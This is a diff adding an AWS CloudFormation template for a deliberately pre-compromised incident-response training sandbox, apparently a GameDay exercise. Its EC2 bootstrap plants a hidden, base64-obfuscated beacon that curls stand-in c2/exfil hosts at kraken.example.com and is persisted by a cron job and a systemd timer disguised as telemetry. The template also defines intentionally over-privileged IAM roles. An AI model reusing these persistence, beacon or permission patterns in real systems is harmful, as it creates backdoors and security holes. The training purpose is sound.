@@ -1,0 +1,348 @@
+AWSTemplateFormatVersion: "2010-09-09"
+Description: >
+  Operation Skyfortress GameDay "Kraken Rising" - a deliberately pre-compromised TRAINING environment
+  for the skyfortress-prod sandbox account (us-east-1). SAFE BY DESIGN: no malware, no external targets,
+  the "beacon" only performs DNS lookups / HTTP attempts against kraken.example.com sub-domains
+  (IANA-reserved, never resolves). Deploy ONLY in a sandbox account you own. Run teardown.sh afterwards.
+
+Parameters:
+  LatestAmiId:
+    Type: AWS::SSM::Parameter::Value<AWS::EC2::Image::Id>
+    Default: /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-arm64
+    Description: Amazon Linux 2023 (arm64) - resolved from the public SSM parameter.
+  InstanceType:
+    Type: String
+    Default: t4g.nano
+    AllowedValues: [t4g.nano, t4g.micro]
+  CaseId:
+    Type: String
+    Default: KRAKEN-001
+
+Resources:
+  # ------------------------------------------------------------------ network
+  Vpc:
+    Type: AWS::EC2::VPC
+    Properties:
+      CidrBlock: 10.66.0.0/16
+      EnableDnsSupport: true
+      EnableDnsHostnames: true
+      Tags: [{ Key: Name, Value: nimbus-dispatch-vpc }, { Key: skyfortress, Value: gameday }]
+
+  Igw:
+    Type: AWS::EC2::InternetGateway
+    Properties:
+      Tags: [{ Key: Name, Value: nimbus-dispatch-igw }]
+
+  IgwAttach:
+    Type: AWS::EC2::VPCGatewayAttachment
+    Properties: { VpcId: !Ref Vpc, InternetGatewayId: !Ref Igw }
+
+  PublicSubnet:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref Vpc
+      CidrBlock: 10.66.1.0/24
+      AvailabilityZone: !Select [0, !GetAZs ""]
+      MapPublicIpOnLaunch: true
+      Tags: [{ Key: Name, Value: nimbus-dispatch-public-a }]
+
+  RouteTable:
+    Type: AWS::EC2::RouteTable
+    Properties:
+      VpcId: !Ref Vpc
+      Tags: [{ Key: Name, Value: nimbus-dispatch-rt }]
+
+  DefaultRoute:
+    Type: AWS::EC2::Route
+    DependsOn: IgwAttach
+    Properties:
+      RouteTableId: !Ref RouteTable
+      DestinationCidrBlock: 0.0.0.0/0
+      GatewayId: !Ref Igw
+
+  SubnetRta:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties: { SubnetId: !Ref PublicSubnet, RouteTableId: !Ref RouteTable }
+
+  DispatchSg:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: nimbus dispatch app - no inbound by design (the Kraken will change that)
+      VpcId: !Ref Vpc
+      Tags: [{ Key: Name, Value: nimbus-dispatch-sg }]
+
+  # ------------------------------------------------------------------ DNS visibility (Day 3 skills)
+  QueryLogGroup:
+    Type: AWS::Logs::LogGroup
+    DeletionPolicy: Delete
+    Properties:
+      LogGroupName: !Sub /skyfortress/${AWS::StackName}/resolver-queries
+      RetentionInDays: 7
+
+  QueryLogConfig:
+    Type: AWS::Route53Resolver::ResolverQueryLoggingConfig
+    Properties:
+      Name: !Sub ${AWS::StackName}-resolver-queries
+      DestinationArn: !GetAtt QueryLogGroup.Arn
+
+  QueryLogAssoc:
+    Type: AWS::Route53Resolver::ResolverQueryLoggingConfigAssociation
+    Properties:
+      ResolverQueryLogConfigId: !GetAtt QueryLogConfig.Id
+      ResourceId: !Ref Vpc
+
+  # ------------------------------------------------------------------ storage
+  CargoBucket:
+    Type: AWS::S3::Bucket
+    Properties:
+      VersioningConfiguration: { Status: Enabled }
+      PublicAccessBlockConfiguration:
+        { BlockPublicAcls: true, BlockPublicPolicy: true, IgnorePublicAcls: true, RestrictPublicBuckets: true }
+      BucketEncryption:
+        ServerSideEncryptionConfiguration:
+          - ServerSideEncryptionByDefault: { SSEAlgorithm: AES256 }
+      OwnershipControls: { Rules: [{ ObjectOwnership: BucketOwnerEnforced }] }
+      Tags: [{ Key: data-class, Value: crown-jewels }, { Key: skyfortress, Value: gameday }]
+
+  ArtifactsBucket:
+    Type: AWS::S3::Bucket
+    Properties:
+      PublicAccessBlockConfiguration:
+        { BlockPublicAcls: true, BlockPublicPolicy: true, IgnorePublicAcls: true, RestrictPublicBuckets: true }
+      OwnershipControls: { Rules: [{ ObjectOwnership: BucketOwnerEnforced }] }
+      Tags: [{ Key: purpose, Value: ci-build-artifacts-and-knowledge-base }, { Key: skyfortress, Value: gameday }]
+
+  EvidenceBucket:
+    Type: AWS::S3::Bucket
+    Properties:
+      VersioningConfiguration: { Status: Enabled }
+      PublicAccessBlockConfiguration:
+        { BlockPublicAcls: true, BlockPublicPolicy: true, IgnorePublicAcls: true, RestrictPublicBuckets: true }
+      OwnershipControls: { Rules: [{ ObjectOwnership: BucketOwnerEnforced }] }
+      Tags: [{ Key: purpose, Value: incident-evidence }, { Key: skyfortress, Value: gameday }]
+
+  # ------------------------------------------------------------------ identities (Day 1 skills)
+  # Patient zero: a CI user with a long-term access key (the key itself is minted by kraken-replay.sh
+  # and "leaked" into a build log so CloudFormation never handles a secret).
+  CiDeployerUser:
+    Type: AWS::IAM::User
+    Properties:
+      UserName: ci-deployer
+      Tags: [{ Key: owner, Value: platform-team }, { Key: skyfortress, Value: gameday }]
+      Policies:
+        - PolicyName: assume-ci-role
+          PolicyDocument:
+            Version: "2012-10-17"
+            Statement:
+              - Effect: Allow
+                Action: sts:AssumeRole
+                Resource: !Sub arn:aws:iam::${AWS::AccountId}:role/nimbus-ci-deploy-role
+              - Effect: Allow
+                Action: sts:GetCallerIdentity
+                Resource: "*"
+
+  # The over-privileged CI role ("it needed iam:* for one Terraform module in 2023...")
+  CiDeployRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: nimbus-ci-deploy-role
+      MaxSessionDuration: 3600
+      AssumeRolePolicyDocument:
+        Version: "2012-10-17"
+        Statement:
+          - Effect: Allow
+            Principal: { AWS: !GetAtt CiDeployerUser.Arn }
+            Action: sts:AssumeRole
+      Policies:
+        - PolicyName: ci-deploy-everything
+          PolicyDocument:
+            Version: "2012-10-17"
+            Statement:
+              - Sid: TooMuchIam
+                Effect: Allow
+                Action: ["iam:*"]
+                Resource: "*"
+              - Sid: TooMuchS3
+                Effect: Allow
+                Action: ["s3:*"]
+                Resource: "*"
+              - Sid: SomeEc2
+                Effect: Allow
+                Action: ["ec2:Describe*", "ec2:AuthorizeSecurityGroupIngress", "ec2:CreateTags"]
+                Resource: "*"
+      Tags: [{ Key: owner, Value: platform-team }, { Key: skyfortress, Value: gameday }]
+
+  # Becomes the Kraken's backdoor once the replay rewrites its trust policy.
+  TelemetryReaderRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: nimbus-telemetry-reader
+      AssumeRolePolicyDocument:
+        Version: "2012-10-17"
+        Statement:
+          - Effect: Allow
+            Principal: { Service: ec2.amazonaws.com }
+            Action: sts:AssumeRole
+      Policies:
+        - PolicyName: read-cargo
+          PolicyDocument:
+            Version: "2012-10-17"
+            Statement:
+              - Effect: Allow
+                Action: ["s3:GetObject", "s3:ListBucket"]
+                Resource: [!GetAtt CargoBucket.Arn, !Sub "${CargoBucket.Arn}/*"]
+      Tags: [{ Key: owner, Value: observability-team }]
+
+  # Dormant service user - the Kraken will mint a fresh key for it (persistence).
+  SvcTelemetryUser:
+    Type: AWS::IAM::User
+    Properties:
+      UserName: svc-telemetry
+      Tags: [{ Key: owner, Value: observability-team }]
+      Policies:
+        - PolicyName: telemetry-list
+          PolicyDocument:
+            Version: "2012-10-17"
+            Statement:
+              - Effect: Allow
+                Action: ["s3:ListAllMyBuckets", "cloudwatch:PutMetricData"]
+                Resource: "*"
+
+  # ------------------------------------------------------------------ workload (Day 3 / Day 5 skills)
+  InstanceRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: "2012-10-17"
+        Statement:
+          - Effect: Allow
+            Principal: { Service: ec2.amazonaws.com }
+            Action: sts:AssumeRole
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
+      Policies:
+        - PolicyName: write-evidence
+          PolicyDocument:
+            Version: "2012-10-17"
+            Statement:
+              - Effect: Allow
+                Action: ["s3:PutObject"]
+                Resource: !Sub "${EvidenceBucket.Arn}/evidence/*"
+
+  InstanceProfile:
+    Type: AWS::IAM::InstanceProfile
+    Properties: { Roles: [!Ref InstanceRole] }
+
+  DispatchInstance:
+    Type: AWS::EC2::Instance
+    DependsOn: [DefaultRoute, QueryLogAssoc]
+    Properties:
+      ImageId: !Ref LatestAmiId
+      InstanceType: !Ref InstanceType
+      SubnetId: !Ref PublicSubnet
+      SecurityGroupIds: [!Ref DispatchSg]
+      IamInstanceProfile: !Ref InstanceProfile
+      Tags:
+        - { Key: Name, Value: nimbus-dispatch-01 }
+        - { Key: app, Value: cargo-dispatch }
+        - { Key: skyfortress, Value: gameday }
+      UserData:
+        Fn::Base64: |
+          #!/bin/bash
+          # Nimbus dispatch node bootstrap + (simulated) Kraken implant. TRAINING ARTIFACT - HARMLESS.
+          dnf install -y cronie >/dev/null 2>&1 || true
+          systemctl enable --now crond || true
+          mkdir -p /opt/nimbus
+          cat > /opt/nimbus/dispatch.sh <<'APP'
+          #!/bin/bash
+          echo "$(date -u +%FT%TZ) dispatch heartbeat ok" >> /var/log/nimbus-dispatch.log
+          APP
+          chmod +x /opt/nimbus/dispatch.sh
+          echo '* * * * * root /opt/nimbus/dispatch.sh' > /etc/cron.d/nimbus-dispatch
+
+          # --- persistence #1: cron beacon (looks for *.kraken.example.com - IANA reserved, never resolves)
+          cat > /usr/local/bin/.kraken-beacon <<'BEACON'
+          #!/bin/bash
+          # kraken beacon v6.6 - training artifact. DNS + HTTP attempts to reserved example.com names only.
+          H=$(hostname -s); L=$(echo ZG5zLW5ldmVyLWxpZXM= | base64 -d)
+          curl -s -m 3 "http://${L}.c2.kraken.example.com/b?h=${H}" >/dev/null 2>&1 || true
+          getent hosts "${H}.exfil.kraken.example.com" >/dev/null 2>&1 || true
+          BEACON
+          chmod 755 /usr/local/bin/.kraken-beacon
+          echo "# $(echo U0tZe3BlcnNpc3RlbmNlX2xpdmVzX2luX2Nyb259 | base64 -d)" > /etc/cron.d/kraken-beacon
+          echo '*/2 * * * * root /usr/local/bin/.kraken-beacon' >> /etc/cron.d/kraken-beacon
+
+          # --- persistence #2: a systemd timer disguised as telemetry (did you find both?)
+          cat > /etc/systemd/system/nimbus-telemetry.service <<'SVC'
+          [Unit]
+          Description=Nimbus telemetry uploader
+          [Service]
+          Type=oneshot
+          ExecStart=/usr/local/bin/.kraken-beacon
+          SVC
+          cat > /etc/systemd/system/nimbus-telemetry.timer <<'TMR'
+          [Unit]
+          Description=Nimbus telemetry schedule
+          [Timer]
+          OnBootSec=60
+          OnUnitActiveSec=300
+          [Install]
+          WantedBy=timers.target
+          TMR
+          systemctl daemon-reload
+          systemctl enable --now nimbus-telemetry.timer
+          /usr/local/bin/.kraken-beacon
+
+  # Evidence capture runbook (Day 5 skill: capture volatile data BEFORE you isolate)
+  CaptureDoc:
+    Type: AWS::SSM::Document
+    Properties:
+      DocumentType: Command
+      Name: !Sub ${AWS::StackName}-CaptureVolatile
+      Content:
+        schemaVersion: "2.2"
+        description: "Skyfortress IR: capture volatile evidence from a Linux host and upload it to the evidence bucket."
+        parameters:
+          EvidenceBucket: { type: String, description: "Evidence bucket name" }
+          CaseId: { type: String, default: KRAKEN-001 }
+        mainSteps:
+          - action: aws:runShellScript
+            name: captureVolatile
+            inputs:
+              timeoutSeconds: "300"
+              runCommand:
+                - |
+                  set -u
+                  TS=$(date -u +%Y%m%dT%H%M%SZ); H=$(hostname -s); D=/tmp/evidence-$H-$TS; mkdir -p $D
+                  ps auxwwf            > $D/processes.txt 2>&1
+                  ss -tupan            > $D/sockets.txt 2>&1
+                  who -a               > $D/logins.txt 2>&1
+                  last -n 50           > $D/last.txt 2>&1
+                  ls -la /etc/cron.d   > $D/cron-listing.txt 2>&1
+                  for f in /etc/cron.d/*; do echo "=== $f"; cat "$f"; done > $D/cron-contents.txt 2>&1
+                  crontab -l -u root   > $D/root-crontab.txt 2>&1
+                  systemctl list-timers --all > $D/systemd-timers.txt 2>&1
+                  find /etc /usr/local /opt /root /home /tmp /var/spool -xdev -type f -mmin -1440 2>/dev/null | grep -v "^$D" | head -500 > $D/recent-files.txt
+                  ls -la /usr/local/bin > $D/usr-local-bin.txt 2>&1
+                  cat /etc/resolv.conf > $D/resolv.txt 2>&1
+                  journalctl --since "-2h" --no-pager | tail -2000 > $D/journal.txt 2>&1
+                  tar czf $D.tgz -C /tmp $(basename $D)
+                  sha256sum $D.tgz > $D.tgz.sha256
+                  TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
+                  REGION=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/placement/region)
+                  aws s3 cp $D.tgz        s3://{{EvidenceBucket}}/evidence/{{CaseId}}/$H-$TS.tgz --region $REGION
+                  aws s3 cp $D.tgz.sha256 s3://{{EvidenceBucket}}/evidence/{{CaseId}}/$H-$TS.tgz.sha256 --region $REGION
+                  echo "Evidence uploaded: s3://{{EvidenceBucket}}/evidence/{{CaseId}}/$H-$TS.tgz"
+
+Outputs:
+  CargoBucket: { Value: !Ref CargoBucket, Description: "Crown-jewel cargo manifests (versioned)" }
+  ArtifactsBucket: { Value: !Ref ArtifactsBucket, Description: "CI build artifacts + chatbot knowledge base" }
+  EvidenceBucket: { Value: !Ref EvidenceBucket, Description: "Write your evidence here" }
+  InstanceId: { Value: !Ref DispatchInstance }
+  DispatchSecurityGroupId: { Value: !Ref DispatchSg }
+  VpcId: { Value: !Ref Vpc }
+  CiDeployRoleArn: { Value: !GetAtt CiDeployRole.Arn }
+  TelemetryRoleArn: { Value: !GetAtt TelemetryReaderRole.Arn }
+  CaptureDocumentName: { Value: !Ref CaptureDoc }
+  ResolverQueryLogGroup: { Value: !Ref QueryLogGroup }
+  CaseId: { Value: !Ref CaseId }
